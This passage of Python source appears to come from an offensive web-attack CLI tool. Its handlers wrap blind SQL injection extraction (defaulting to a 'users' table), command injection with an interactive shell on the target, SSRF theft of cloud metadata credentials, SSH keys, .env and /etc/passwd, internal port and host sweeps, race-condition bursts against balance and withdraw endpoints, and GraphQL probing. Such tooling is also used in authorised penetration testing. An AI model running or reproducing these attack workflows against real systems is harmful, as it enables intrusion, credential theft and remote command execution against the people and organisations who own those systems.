        candidates = quick.get('origin_ips', [])
        if not candidates:
            console.print("[bold yellow][!] No candidate IPs found to verify. Run scan 50 first.[/bold yellow]")
            return
        
        # Verify top candidates
        verified_results = []
        for candidate in candidates[:10]:
            ip = candidate.get('ip', '')
            if not ip:
                continue
            console.print(f"  [cyan]*[/cyan] Verifying {ip}...")
            verification = self.origin_ip.verify_origin_ip(self.target, ip)
            verified_results.append(verification)
        
        self.results['findings']['ip_verification'] = verified_results
        
        # Display results
        v_table = Table(
            title="IP Verification Results",
            box=box.ROUNDED, border_style="magenta"
        )
        v_table.add_column("IP", style="bold red")
        v_table.add_column("Verified", style="bold green")
        v_table.add_column("Match Score", style="yellow")
        v_table.add_column("Methods", style="cyan")
        v_table.add_column("Evidence", style="dim")
        
        for v in verified_results:
            verified = v.get('verified', False)
            ver_str = "[bold green]YES[/bold green]" if verified else "[red]NO[/red]"
            score = v.get('response_similarity', 0)
            methods = ', '.join(v.get('methods', []))
            evidence = '; '.join(v.get('evidence', []))[:60]
            v_table.add_row(
                v.get('ip', ''),
                ver_str,
                f"{score}%",
                methods,
                evidence
            )
        
        console.print(v_table)
        
        verified = [v for v in verified_results if v.get('verified')]
        if verified:
            console.print(f"\n[bold green][+] {len(verified)} VERIFIED ORIGIN IP(S) FOUND![/bold green]")
            for v in verified:
                console.print(f"  [bold green]*[/bold green] {v.get('ip', '')} (Match: {v.get('response_similarity', 0)}%)")
        else:
            console.print("[bold yellow][!] No IPs could be verified as origin[/bold yellow]")
    
    # ========================================================================
    # HAKUIN-OPTIMIZED BLIND SQLi SCANS (v3.0 Fusion)
    # Fused from: github.com/pruzko/hakuin - 10x faster blind SQLi extraction
    # ========================================================================
    
    def _scan_blind_sqli_detect(self):
        """Blind SQLi Vulnerability Detector - Auto-detect blind SQLi"""
        console.print(f"\n[bold magenta][*] Blind SQLi Detection on {self.target}[/bold magenta]")
        console.print("[dim]Hakuin-Optimized Engine | Testing boolean-based & time-based inference[/dim]")
        
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold magenta]Testing for blind SQLi vulnerabilities...[/bold magenta]"):
            # First, find parameters to test
            params_to_test = ['id', 'page', 'q', 'search', 'user', 'item', 'cat',
                            'category', 'pid', 'uid', 'sid', 'tid', 'nid', 'lid',
                            'sort', 'order', 'limit', 'offset', 'action', 'type',
                            'status', 'role', 'year', 'month', 'date', 'view']
            
            all_results = []
            for param in params_to_test:
                result = self.blind_sqli_detector.detect(url, param=param)
                if result.get('vulnerable'):
                    all_results.append(result)
        
        self.results['findings']['blind_sqli'] = {
            'vulnerable': len(all_results) > 0,
            'findings': all_results,
        }
        
        if all_results:
            console.print("[bold red][!] Blind SQLi Vulnerability Detected![/bold red]")
            d_table = Table(title="Blind SQLi Vulnerabilities", box=box.HEAVY, border_style="red")
            d_table.add_column("Parameter", style="bold red")
            d_table.add_column("Type", style="yellow")
            d_table.add_column("DBMS", style="cyan")
            d_table.add_column("Inference", style="green")
            for r in all_results:
                inference = r.get('inference_config', {})
                inf_str = f"{inference.get('inference_type', '?')}:{inference.get('inference_content', '?')}"
                d_table.add_row(
                    r.get('param', '?'),
                    r.get('type', '?'),
                    r.get('dbms', 'unknown'),
                    inf_str,
                )
            console.print(d_table)
            
            console.print("\n[bold cyan][*] Use scan 57-60 for data extraction with Hakuin optimization[/bold cyan]")
        else:
            console.print("[bold green][+] No blind SQLi vulnerabilities detected[/bold green]")
    
    def _scan_blind_sqli_schemas(self):
        """Blind SQLi Schema Extraction - Hakuin-Optimized Binary Search"""
        console.print(f"\n[bold magenta][*] Blind SQLi Schema Extraction on {self.target}[/bold magenta]")
        console.print("[dim]Hakuin Binary Search | ~7 requests per character (vs 128 linear)[/dim]")
        
        url = f"{self.protocol}{self.target}"
        
        # Ask for injection configuration
        console.print("\n[bold yellow]Configure Blind SQLi Extraction:[/bold yellow]")
        console.print("[dim]Example URL: https://target.com/page?id={query}[/dim]")
        inject_url = Prompt.ask("[cyan]Injection URL (with {query} tag)[/cyan]", default=f"{url}?id={{query}}")
        dbms = Prompt.ask("[cyan]DBMS Type[/cyan]", choices=['mysql', 'postgres', 'sqlite', 'mssql', 'oracle'], default='mysql')
        inf_type = Prompt.ask("[cyan]Inference Method[/cyan]", choices=['status', 'header', 'body'], default='body')
        inf_content = Prompt.ask("[cyan]True Condition Marker[/cyan]", default='true')
        negated = Confirm.ask("[cyan]Negate inference?[/cyan]", default=False)
        
        self.hakuin.setup_inference(
            url=inject_url,
            inference_type=inf_type,
            inference_content=inf_content,
            negated=negated,
            dbms=dbms,
        )
        
        # Test connection
        console.print("[bold cyan]Testing injection point...[/bold cyan]")
        if not self.hakuin.inference.test_connection():
            console.print("[bold red][!] Injection point not working! Check your configuration.[/bold red]")
            return
        
        console.print("[bold green][+] Injection point verified![/bold green]")
        
        with console.status("[bold magenta]Extracting schema names (binary search)...[/bold magenta]"):
            schemas = self.hakuin.extract_schemas()
        
        self.results['findings']['blind_sqli_schemas'] = schemas
        
        if schemas:
            s_table = Table(title="Extracted Schemas", box=box.ROUNDED, border_style="magenta")
            s_table.add_column("#", style="dim")
            s_table.add_column("Schema Name", style="bold cyan")
            for i, schema in enumerate(schemas, 1):
                s_table.add_row(str(i), schema)
            console.print(s_table)
        else:
            console.print("[yellow][!] No schemas extracted[/yellow]")
        
        stats = self.hakuin.get_stats()
        console.print(f"[dim]Requests: {stats.get('total_requests', 0)} | Errors: {stats.get('errors', 0)}[/dim]")
    
    def _scan_blind_sqli_meta(self):
        """Blind SQLi Metadata Extraction - Tables + Columns"""
        console.print(f"\n[bold magenta][*] Blind SQLi Metadata Extraction on {self.target}[/bold magenta]")
        console.print("[dim]Hakuin Binary Search | Extracting table & column names[/dim]")
        
        url = f"{self.protocol}{self.target}"
        inject_url = Prompt.ask("[cyan]Injection URL (with {query} tag)[/cyan]", default=f"{url}?id={{query}}")
        dbms = Prompt.ask("[cyan]DBMS Type[/cyan]", choices=['mysql', 'postgres', 'sqlite', 'mssql', 'oracle'], default='mysql')
        inf_type = Prompt.ask("[cyan]Inference Method[/cyan]", choices=['status', 'header', 'body'], default='body')
        inf_content = Prompt.ask("[cyan]True Condition Marker[/cyan]", default='true')
        negated = Confirm.ask("[cyan]Negate inference?[/cyan]", default=False)
        schema_name = Prompt.ask("[cyan]Schema name (leave blank for default)[/cyan]", default="")
        
        self.hakuin.setup_inference(
            url=inject_url,
            inference_type=inf_type,
            inference_content=inf_content,
            negated=negated,
            dbms=dbms,
        )
        
        if not self.hakuin.inference.test_connection():
            console.print("[bold red][!] Injection point not working![/bold red]")
            return
        
        with console.status("[bold magenta]Extracting metadata (tables + columns)...[/bold magenta]"):
            meta = self.hakuin.extract_meta(schema=schema_name or None)
        
        self.results['findings']['blind_sqli_meta'] = meta
        
        if meta:
            m_table = Table(title="Database Metadata", box=box.HEAVY, border_style="magenta")
            m_table.add_column("Table", style="bold red")
            m_table.add_column("Columns", style="cyan")
            m_table.add_column("Column Count", style="yellow")
            for table, columns in meta.items():
                col_str = ', '.join(columns) if columns else '[]'
                m_table.add_row(table, col_str[:80], str(len(columns)))
            console.print(m_table)
        else:
            console.print("[yellow][!] No metadata extracted[/yellow]")
        
        stats = self.hakuin.get_stats()
        console.print(f"[dim]Requests: {stats.get('total_requests', 0)} | Errors: {stats.get('errors', 0)}[/dim]")
    
    def _scan_blind_sqli_data(self):
        """Blind SQLi Data Extraction - Binary Search (10x Faster)"""
        console.print(f"\n[bold magenta][*] Blind SQLi Data Extraction on {self.target}[/bold magenta]")
        console.print("[dim]Hakuin Binary Search | Character-by-character with optimization[/dim]")
        
        url = f"{self.protocol}{self.target}"
        inject_url = Prompt.ask("[cyan]Injection URL (with {query} tag)[/cyan]", default=f"{url}?id={{query}}")
        dbms = Prompt.ask("[cyan]DBMS Type[/cyan]", choices=['mysql', 'postgres', 'sqlite', 'mssql', 'oracle'], default='mysql')
        inf_type = Prompt.ask("[cyan]Inference Method[/cyan]", choices=['status', 'header', 'body'], default='body')
        inf_content = Prompt.ask("[cyan]True Condition Marker[/cyan]", default='true')
        negated = Confirm.ask("[cyan]Negate inference?[/cyan]", default=False)
        table_name = Prompt.ask("[cyan]Table name to extract[/cyan]", default="users")
        column_name = Prompt.ask("[cyan]Column name (leave blank for all)[/cyan]", default="")
        schema_name = Prompt.ask("[cyan]Schema name (leave blank for default)[/cyan]", default="")
        
        self.hakuin.setup_inference(
            url=inject_url,
            inference_type=inf_type,
            inference_content=inf_content,
            negated=negated,
            dbms=dbms,
        )
        
        if not self.hakuin.inference.test_connection():
            console.print("[bold red][!] Injection point not working![/bold red]")
            return
        
        console.print(f"[bold cyan]Extracting data from {table_name}...[/bold cyan]")
        
        with console.status("[bold magenta]Extracting data (binary search optimization)...[/bold magenta]"):
            data = self.hakuin.extract_data(
                table=table_name,
                column=column_name or None,
                schema=schema_name or None,
            )
        
        self.results['findings']['blind_sqli_data'] = data
        
        if data:
            for col, values in data.items():
                d_table = Table(title=f"Column: {col}", box=box.ROUNDED, border_style="magenta")
                d_table.add_column("#", style="dim")
                d_table.add_column("Value", style="bold red")
                for i, val in enumerate(values[:50], 1):
                    d_table.add_row(str(i), str(val) if val is not None else '[NULL]')
                console.print(d_table)
                if len(values) > 50:
                    console.print(f"[yellow]... and {len(values) - 50} more rows[/yellow]")
        else:
            console.print("[yellow][!] No data extracted[/yellow]")
        
        stats = self.hakuin.get_stats()
        console.print(f"[dim]Total Requests: {stats.get('total_requests', 0)} | Errors: {stats.get('errors', 0)}[/dim]")
    
    def _scan_blind_sqli_full(self):
        """Blind SQLi Full Pipeline - Detect + Extract All Data"""
        console.print(f"\n[bold magenta][*] Blind SQLi Full Pipeline on {self.target}[/bold magenta]")
        console.print("[dim]Hakuin-Optimized | Auto-detect + Full extraction[/dim]")
        
        url = f"{self.protocol}{self.target}"
        
        # Phase 1: Auto-detect
        console.print("\n[bold cyan]Phase 1: Auto-detecting blind SQLi...[/bold cyan]")
        with console.status("[bold magenta]Scanning for vulnerable parameters...[/bold magenta]"):
            params_to_test = ['id', 'page', 'q', 'search', 'user', 'item', 'cat',
                            'uid', 'sid', 'tid', 'nid', 'pid', 'lid']
            detected = None
            for param in params_to_test:
                result = self.blind_sqli_detector.detect(url, param=param)
                if result.get('vulnerable'):
                    detected = result
                    break
        
        if not detected:
            console.print("[bold yellow][!] No blind SQLi auto-detected. Configure manually.[/bold yellow]")
            inject_url = Prompt.ask("[cyan]Injection URL (with {query} tag)[/cyan]", default=f"{url}?id={{query}}")
            dbms = Prompt.ask("[cyan]DBMS Type[/cyan]", choices=['mysql', 'postgres', 'sqlite', 'mssql', 'oracle'], default='mysql')
            inf_type = 'body'
            inf_content = 'true'
            negated = False
        else:
            console.print(f"[bold green][+] Blind SQLi found on parameter: {detected.get('param', '?')}[/bold green]")
            console.print(f"  Type: {detected.get('type', '?')} | DBMS: {detected.get('dbms', 'unknown')}")
            inf_config = detected.get('inference_config', {})
            inf_type = inf_config.get('inference_type', 'body')
            inf_content = inf_config.get('inference_content', 'true')
            negated = inf_config.get('negated', False)
            dbms = detected.get('dbms', 'mysql') or 'mysql'
            param = detected.get('param', 'id')
            inject_url = f"{url}?{param}={{query}}"
        
        self.hakuin.setup_inference(
            url=inject_url,
            inference_type=inf_type,
            inference_content=inf_content,
            negated=negated,
            dbms=dbms,
        )
        
        if not self.hakuin.inference.test_connection():
            console.print("[bold red][!] Injection verification failed![/bold red]")
            return
        
        # Phase 2: Extract schemas
        console.print("\n[bold cyan]Phase 2: Extracting schemas...[/bold cyan]")
        with console.status("[bold magenta]Binary search schema extraction...[/bold magenta]"):
            schemas = self.hakuin.extract_schemas()
        if schemas:
            console.print(f"  [green]*[/green] Found {len(schemas)} schemas: {', '.join(schemas[:10])}")
        
        # Phase 3: Extract tables
        console.print("\n[bold cyan]Phase 3: Extracting table names...[/bold cyan]")
        with console.status("[bold magenta]Binary search table extraction...[/bold magenta]"):
            tables = self.hakuin.extract_tables()
        if tables:
            console.print(f"  [green]*[/green] Found {len(tables)} tables: {', '.join(tables[:10])}")
        
        # Phase 4: Extract metadata for top tables
        console.print("\n[bold cyan]Phase 4: Extracting column names...[/bold cyan]")
        all_meta = {}
        for table in tables[:10]:  # Limit to first 10 tables
            with console.status(f"[bold magenta]Extracting columns for {table}...[/bold magenta]"):
                columns = self.hakuin.extract_columns(table=table)
            all_meta[table] = columns
            if columns:
                console.print(f"  [green]*[/green] {table}: {', '.join(columns[:10])}")
        
        self.results['findings']['blind_sqli_full'] = {
            'schemas': schemas,
            'tables': tables,
            'metadata': all_meta,
            'stats': self.hakuin.get_stats(),
        }
        
        # Display summary
        if all_meta:
            summary_table = Table(
                title="Blind SQLi Extraction Summary",
                box=box.HEAVY, border_style="magenta"
            )
            summary_table.add_column("Table", style="bold red")
            summary_table.add_column("Columns", style="cyan")
            summary_table.add_column("Count", style="yellow")
            for table, columns in all_meta.items():
                col_str = ', '.join(columns) if columns else '[]'
                summary_table.add_row(table, col_str[:80], str(len(columns)))
            console.print(summary_table)
        
        stats = self.hakuin.get_stats()
        console.print(f"\n[bold green][+] Extraction Complete![/bold green]")
        console.print(f"[dim]Total Requests: {stats.get('total_requests', 0)} | Errors: {stats.get('errors', 0)}[/dim]")
        console.print(f"[dim]Use scan 59 to extract actual data from specific tables/columns[/dim]")
    
    # ========================================================================
    # COMMAND INJECTION SCANS (Commix Fusion v3.0)
    # Fused from: github.com/commixproject/commix
    # ========================================================================
    
    def _scan_cmd_inject_detect(self):
        """Command Injection Detector - Commix Fusion"""
        console.print(f"\n[bold red][*] Command Injection Detection on {self.target}[/bold red]")
        console.print("[dim]Commix Fusion Engine | Testing boolean-based & time-based CMDi[/dim]")
        
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold red]Testing for command injection vulnerabilities...[/bold red]"):
            result = self.cmd_inject.scan_detect(url)
        
        self.results['findings']['cmd_injection'] = result
        
        if result.get('vulnerable'):
            console.print("[bold red][!] Command Injection Vulnerability Detected![/bold red]")
            v_table = Table(title="Command Injection Findings", box=box.HEAVY, border_style="red")
            v_table.add_column("Parameter", style="bold red")
            v_table.add_column("Type", style="yellow")
            v_table.add_column("Separator", style="cyan")
            v_table.add_column("Prefix", style="green")
            v_table.add_column("Suffix", style="magenta")
            for f in result.get('findings', []):
                v_table.add_row(
                    str(f.get('parameter', '')),
                    str(f.get('type', '')),
                    str(f.get('separator', '')),
                    str(f.get('prefix', '')),
                    str(f.get('suffix', '')),
                )
            console.print(v_table)
            console.print("\n[bold cyan][*] Use scan 62 for OS detection, scan 63 for interactive shell[/bold cyan]")
        else:
            console.print("[bold green][+] No command injection vulnerabilities detected[/bold green]")
    
    def _scan_cmd_inject_os(self):
        """Command Injection + OS Detection - Commix Fusion"""
        console.print(f"\n[bold red][*] Command Injection + OS Detection on {self.target}[/bold red]")
        console.print("[dim]Commix Fusion Engine | Detecting target operating system[/dim]")
        
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold red]Detecting OS and command injection...[/bold red]"):
            result = self.cmd_inject.scan_detect_os(url)
        
        self.results['findings']['cmd_injection_os'] = result
        
        if result.get('vulnerable'):
            console.print("[bold red][!] Command Injection Detected![/bold red]")
            os_info = result.get('os', 'unknown')
            console.print(f"  [bold yellow]Target OS: {os_info.upper()}[/bold yellow]")
            
            v_table = Table(title="Command Injection + OS", box=box.HEAVY, border_style="red")
            v_table.add_column("Parameter", style="bold red")
            v_table.add_column("Type", style="yellow")
            v_table.add_column("OS", style="bold cyan")
            v_table.add_column("Separator", style="green")
            for f in result.get('findings', []):
                v_table.add_row(
                    str(f.get('parameter', '')),
                    str(f.get('type', '')),
                    os_info,
                    str(f.get('separator', '')),
                )
            console.print(v_table)
            
            console.print("\n[bold cyan][*] Use scan 63 for interactive shell[/bold cyan]")
        else:
            console.print("[bold green][+] No command injection vulnerabilities detected[/bold green]")
    
    def _scan_cmd_inject_shell(self):
        """Command Injection Interactive Shell - Commix Fusion"""
        console.print(f"\n[bold red][*] Command Injection Shell on {self.target}[/bold red]")
        console.print("[dim]Commix Fusion Engine | Interactive pseudo-shell[/dim]")
        
        url = f"{self.protocol}{self.target}"
        
        console.print("\n[bold yellow]Configure Command Injection:[/bold yellow]")
        inject_url = Prompt.ask("[cyan]Target URL[/cyan]", default=url)
        param = Prompt.ask("[cyan]Vulnerable parameter[/cyan]", default="id")
        technique = Prompt.ask("[cyan]Technique[/cyan]", choices=['auto', 'classic', 'blind'], default='auto')
        
        # Quick detect first
        with console.status("[bold red]Detecting injection point...[/bold red]"):
            detect_result = self.cmd_inject.detect(inject_url, param=param)
        
        if not detect_result.get('vulnerable'):
            console.print("[bold yellow][!] Auto-detection didn't find CMDi. Trying anyway...[/bold yellow]")
        
        console.print("[bold green][+] Launching interactive shell! Type 'exit' to quit.[/bold green]")
        console.print("[dim]Commands: help, os, technique, tamper, separator, exit[/dim]")
        
        self.cmd_inject.get_shell(inject_url, param)
    
    # ========================================================================
    # SSRF EXPLOITATION SCANS (SSRFmap Fusion v3.0)
    # ========================================================================
    
    def _scan_ssrf_detect(self):
        """SSRF Vulnerability Detector - 5-Level Bypass"""
        console.print(f"\n[bold red][*] SSRF Detection on {self.target}[/bold red]")
        console.print("[dim]SSRFmap Fusion Engine | 5-Level IP Obfuscation | Timing Analysis[/dim]")
        
        url = f"{self.protocol}{self.target}"
        inject_url = Prompt.ask("[cyan]Target URL with parameter[/cyan]", default=url)
        param = Prompt.ask("[cyan]Parameter to test[/cyan]", default="url")
        
        with console.status("[bold red]Detecting SSRF with 5-level bypass...[/bold red]"):
            result = self.ssrf_engine.scan_ssrf_detect(inject_url, param)
        
        self.results['findings']['ssrf_detect'] = result
        
        if result.get('vulnerable'):
            console.print("[bold red][!] SSRF VULNERABILITY DETECTED![/bold red]")
            if result['basic'].get('findings'):
                for f in result['basic']['findings']:
                    console.print(f"  [red][+] {f['test']}: {f.get('evidence', '')[:80]}[/red]")
            if result['bypass'].get('bypasses'):
                console.print(f"  [yellow][+] {len(result['bypass']['bypasses'])} bypass techniques worked[/yellow]")
        else:
            console.print("[green][+] No SSRF detected[/green]")
    
    def _scan_ssrf_cloud_meta(self):
        """SSRF Cloud Metadata Extraction - AWS/GCE/Azure/DigitalOcean/Alibaba"""
        console.print(f"\n[bold red][*] SSRF Cloud Metadata Extraction on {self.target}[/bold red]")
        console.print("[dim]Extracting: AWS IAM, GCE SSH Keys, Azure Managed Identity, Alibaba, DigitalOcean[/dim]")
        
        url = f"{self.protocol}{self.target}"
        inject_url = Prompt.ask("[cyan]Target URL with SSRF param[/cyan]", default=url)
        param = Prompt.ask("[cyan]SSRF Parameter[/cyan]", default="url")
        
        providers = Prompt.ask(
            "[cyan]Cloud providers (comma-separated: AWS,GCE,Azure,DigitalOcean,Alibaba)[/cyan]",
            default="AWS,GCE,Azure,DigitalOcean,Alibaba"
        )
        provider_list = [p.strip() for p in providers.split(",")]
        
        with console.status("[bold red]Extracting cloud metadata via SSRF...[/bold red]"):
            result = self.ssrf_engine.scan_cloud_metadata(
                inject_url, param, providers=provider_list)
        
        self.results['findings']['ssrf_cloud'] = result
        
        if result.get('extracted', {}).get('extracted'):
            console.print("[bold red][!] CLOUD METADATA EXTRACTED![/bold red]")
            for provider, data in result['extracted']['extracted'].items():
                console.print(f"  [bold yellow][+] {provider}: {len(data)} endpoints leaked[/bold yellow]")
                v_table = Table(title=f"{provider} Metadata", box=box.HEAVY, border_style="red")
                v_table.add_column("Endpoint", style="red")
                v_table.add_column("Data", style="yellow")
                for endpoint, content in data.items():
                    v_table.add_row(endpoint, content[:100])
                console.print(v_table)
        else:
            console.print("[green][+] No cloud metadata extracted[/green]")
    
    def _scan_ssrf_fileread(self):
        """SSRF File Reader - Read local files via file:// protocol"""
        console.print(f"\n[bold red][*] SSRF File Reader on {self.target}[/bold red]")
        console.print("[dim]Reading /etc/passwd, /proc/self/environ, .env, SSH keys via SSRF[/dim]")
        
        url = f"{self.protocol}{self.target}"
        inject_url = Prompt.ask("[cyan]Target URL with SSRF param[/cyan]", default=url)
        param = Prompt.ask("[cyan]SSRF Parameter[/cyan]", default="url")
        
        with console.status("[bold red]Reading files via SSRF...[/bold red]"):
            result = self.ssrf_engine.scan_ssrf_fileread(inject_url, param)
        
        self.results['findings']['ssrf_fileread'] = result
        
        if result.get('files_read'):
            console.print("[bold red][!] FILES READ VIA SSRF![/bold red]")
            v_table = Table(title="SSRF File Read Results", box=box.HEAVY, border_style="red")
            v_table.add_column("File Path", style="red")
            v_table.add_column("Content Preview", style="yellow")
            for filepath, content in result['files_read'].items():
                v_table.add_row(filepath, content[:120])
            console.print(v_table)
        else:
            console.print("[green][+] No files readable via SSRF[/green]")
    
    def _scan_ssrf_portscan(self):
        """SSRF Port Scanner - Scan internal network ports"""
        console.print(f"\n[bold red][*] SSRF Port Scanner on {self.target}[/bold red]")
        console.print("[dim]Scanning internal services: MySQL, Redis, Docker API, etc.[/dim]")
        
        url = f"{self.protocol}{self.target}"
        inject_url = Prompt.ask("[cyan]Target URL with SSRF param[/cyan]", default=url)
        param = Prompt.ask("[cyan]SSRF Parameter[/cyan]", default="url")
        target_ip = Prompt.ask("[cyan]Internal IP to scan[/cyan]", default="127.0.0.1")
        
        with console.status("[bold red]Scanning internal ports via SSRF...[/bold red]"):
            result = self.ssrf_engine.scan_ssrf_portscan(
                inject_url, param, target_ip=target_ip)
        
        self.results['findings']['ssrf_portscan'] = result
        
        if result.get('open_ports'):
            console.print(f"[bold red][!] {len(result['open_ports'])} OPEN PORTS FOUND![/bold red]")
            v_table = Table(title="SSRF Port Scan Results", box=box.HEAVY, border_style="red")
            v_table.add_column("Port", style="bold red")
            v_table.add_column("Status", style="yellow")
            v_table.add_column("Diff Length", style="cyan")
            for port_info in result['open_ports']:
                v_table.add_row(
                    str(port_info['port']),
                    "OPEN",
                    str(port_info.get('diff_length', 0)),
                )
            console.print(v_table)
        else:
            console.print("[green][+] No open ports found via SSRF[/green]")
    
    def _scan_ssrf_network(self):
        """SSRF Network Discovery - Ping sweep internal networks"""
        console.print(f"\n[bold red][*] SSRF Network Discovery on {self.target}[/bold red]")
        console.print("[dim]Discovering alive hosts on 192.168.x.x, 10.x.x.x networks[/dim]")
        
        url = f"{self.protocol}{self.target}"
        inject_url = Prompt.ask("[cyan]Target URL with SSRF param[/cyan]", default=url)
        param = Prompt.ask("[cyan]SSRF Parameter[/cyan]", default="url")
        
        ranges = Prompt.ask(
            "[cyan]CIDR ranges (comma-separated)[/cyan]",
            default="192.168.1.0/24,10.0.0.0/24"
        )
        cidr_list = [r.strip() for r in ranges.split(",")]
        
        with console.status("[bold red]Discovering internal hosts via SSRF...[/bold red]"):
            result = self.ssrf_engine.scan_ssrf_network(
                inject_url, param, cidr_ranges=cidr_list)
        
        self.results['findings']['ssrf_network'] = result
        
        if result.get('alive_hosts'):
            console.print(f"[bold red][!] {len(result['alive_hosts'])} ALIVE HOSTS FOUND![/bold red]")
            v_table = Table(title="SSRF Network Discovery", box=box.HEAVY, border_style="red")
            v_table.add_column("IP", style="bold red")
            v_table.add_column("Status", style="yellow")
            for host in result['alive_hosts']:
                v_table.add_row(host['ip'], "ALIVE")
            console.print(v_table)
        else:
            console.print("[green][+] No alive hosts found[/green]")
    
    # ========================================================================
    # RACE CONDITION SCANS (Race-the-Web Fusion v3.0)
    # ========================================================================
    
    def _scan_race_single(self):
        """Race Condition Test - Single Endpoint with Barrier Fire"""
        console.print(f"\n[bold red][*] Race Condition Test on {self.target}[/bold red]")
        console.print("[dim]Race-the-Web Fusion | Barrier-Based Simultaneous Fire | Semantic Comparison[/dim]")
        
        url = f"{self.protocol}{self.target}"
        target_url = Prompt.ask("[cyan]Target URL[/cyan]", default=url)
        method = Prompt.ask("[cyan]HTTP Method[/cyan]", choices=['GET', 'POST', 'PUT', 'PATCH'], default='POST')
        body = Prompt.ask("[cyan]Request Body (for POST)[/cyan]", default="")
        count = int(Prompt.ask("[cyan]Number of concurrent requests[/cyan]", default="100"))
        
        with console.status(f"[bold red]Sending {count} simultaneous requests...[/bold red]"):
            result = self.race_engine.scan_race_single(
                target_url, method=method, body=body, count=count)
        
        self.results['findings']['race_single'] = result
        
        if result.get('race_detected'):
            console.print("[bold red][!] RACE CONDITION DETECTED![/bold red]")
            console.print(f"  [red]{result['race_evidence']}[/red]")
            
            v_table = Table(title="Race Condition - Response Clusters", box=box.HEAVY, border_style="red")
            v_table.add_column("Cluster", style="bold")
            v_table.add_column("Status Code", style="red")
            v_table.add_column("Count", style="yellow")
            v_table.add_column("Content Length", style="cyan")
            for i, cluster in enumerate(result.get('unique_clusters', [])):
                style_str = "bold red" if i > 0 else "green"
                v_table.add_row(
                    f"Cluster {i+1}",
                    str(cluster['status_code']),
                    str(cluster['count']),
                    str(cluster['content_length']),
                )
            console.print(v_table)
        else:
            console.print("[green][+] No race condition detected[/green]")
    
    def _scan_race_multi(self):
        """Race Condition Test - Multi-Endpoint"""
        console.print(f"\n[bold red][*] Multi-Endpoint Race Condition Test on {self.target}[/bold red]")
        console.print("[dim]Testing cross-endpoint race conditions[/dim]")
        
        url = f"{self.protocol}{self.target}"
        urls_input = Prompt.ask(
            "[cyan]Target URLs (comma-separated)[/cyan]",
            default=f"{url}/api/balance,{url}/api/transfer"
        )
        urls = [u.strip() for u in urls_input.split(",")]
        method = Prompt.ask("[cyan]HTTP Method[/cyan]", choices=['GET', 'POST', 'PUT'], default='POST')
        count = int(Prompt.ask("[cyan]Number of passes[/cyan]", default="50"))
        
        with console.status("[bold red]Testing multi-endpoint race conditions...[/bold red]"):
            result = self.race_engine.scan_race_multi(
                urls, method=method, count=count)
        
        self.results['findings']['race_multi'] = result
        
        if result.get('race_detected'):
            console.print("[bold red][!] CROSS-ENDPOINT RACE CONDITION DETECTED![/bold red]")
            for inc in result.get('inconsistencies', []):
                console.print(f"  [red]Pass {inc['pass']}: {inc['unique_responses']} unique responses[/red]")
        else:
            console.print("[green][+] No cross-endpoint race condition detected[/green]")
    
    def _scan_race_toctou(self):
        """TOCTOU Race Condition - Time-Of-Check vs Time-Of-Use"""
        console.print(f"\n[bold red][*] TOCTOU Race Condition Test on {self.target}[/bold red]")
        console.print("[dim]Simultaneous Read (check) + Write (use) to detect state inconsistency[/dim]")
        
        url = f"{self.protocol}{self.target}"
        read_url = Prompt.ask("[cyan]Read/Check URL[/cyan]", default=f"{url}/api/balance")
        write_url = Prompt.ask("[cyan]Write/Use URL[/cyan]", default=f"{url}/api/withdraw")
        write_body = Prompt.ask("[cyan]Write request body[/cyan]", default='amount=1')
        count = int(Prompt.ask("[cyan]Number of concurrent pairs[/cyan]", default="100"))
        
        with console.status("[bold red]Testing TOCTOU race condition...[/bold red]"):
            result = self.race_engine.scan_race_toctou(
                read_url, write_url,
                write_method="POST", write_body=write_body,
                count=count)
        
        self.results['findings']['race_toctou'] = result
        
        if result.get('race_detected'):
            console.print("[bold red][!] TOCTOU RACE CONDITION DETECTED![/bold red]")
            console.print(f"  [red]{result['toctou_evidence']}[/red]")
        else:
            console.print("[green][+] No TOCTOU race condition detected[/green]")
    
    # ========================================================================
    # GRAPHQL SECURITY SCANS (GraphQL-Cop Fusion v3.0)
    # ========================================================================
    
    def _scan_graphql_full(self):
        """GraphQL Full Security Audit - 15 Tests"""
        console.print(f"\n[bold red][*] GraphQL Security Audit on {self.target}[/bold red]")
        console.print("[dim]GraphQL-Cop Fusion | 15 Security Tests | Info + CSRF + DoS + Enhanced[/dim]")
        
        url = f"{self.protocol}{self.target}"
        graphql_url = Prompt.ask("[cyan]GraphQL endpoint URL[/cyan]", default=f"{url}/graphql")
        
        with console.status("[bold red]Running 15 GraphQL security tests...[/bold red]"):
            result = self.graphql_engine.scan_graphql_full(graphql_url)
        
        self.results['findings']['graphql_full'] = result
        
        if result.get('is_graphql'):
            summary = result.get('summary', {})
            console.print(f"\n[bold yellow]Results: {summary.get('high', 0)} HIGH | "
                         f"{summary.get('medium', 0)} MEDIUM | "
                         f"{summary.get('low', 0)} LOW | "
                         f"{summary.get('info', 0)} INFO | "
                         f"{summary.get('passed', 0)} Passed[/bold yellow]")
            
            # Display findings table
            v_table = Table(title="GraphQL Security Results", box=box.HEAVY, border_style="yellow")
            v_table.add_column("Test", style="bold")
            v_table.add_column("Severity", style="bold")
            v_table.add_column("Result", style="bold")
            v_table.add_column("Description", style="white")
            
            for r in result.get('results', []):
                status = "VULN" if r['result'] else "SAFE"
                severity_color = {'HIGH': 'red', 'MEDIUM': 'yellow', 'LOW': 'blue', 'INFO': 'dim'}.get(r['severity'], 'white')
                v_table.add_row(
                    r['title'],
                    f"[{severity_color}]{r['severity']}[/{severity_color}]",
                    f"[{'red' if r['result'] else 'green'}]{status}[/{'red' if r['result'] else 'green'}]",
                    r['description'][:80],
                )
            console.print(v_table)
        else:
            console.print("[bold red][!] Not a GraphQL endpoint![/bold red]")
    
    def _scan_graphql_discover(self):
        """GraphQL Endpoint Discovery"""
        console.print(f"\n[bold red][*] GraphQL Endpoint Discovery on {self.target}[/bold red]")
        console.print("[dim]Probing /graphql, /graphiql, /api/graphql, /playground, etc.[/dim]")
        
        url = f"{self.protocol}{self.target}"
        base_url = Prompt.ask("[cyan]Base URL[/cyan]", default=url)
        
        with console.status("[bold red]Discovering GraphQL endpoints...[/bold red]"):
            result = self.graphql_engine.scan_graphql_discover(base_url)
        
        self.results['findings']['graphql_discover'] = result
        
        if result.get('endpoints_found'):
            console.print(f"[bold green][+] Found {len(result['endpoints_found'])} GraphQL endpoints![/bold green]")
            for ep in result['endpoints_found']:
                console.print(f"  [green][+] {ep}[/green]")
        else:
            console.print("[yellow][!] No GraphQL endpoints discovered[/yellow]")
    
    def _scan_graphql_introspection(self):
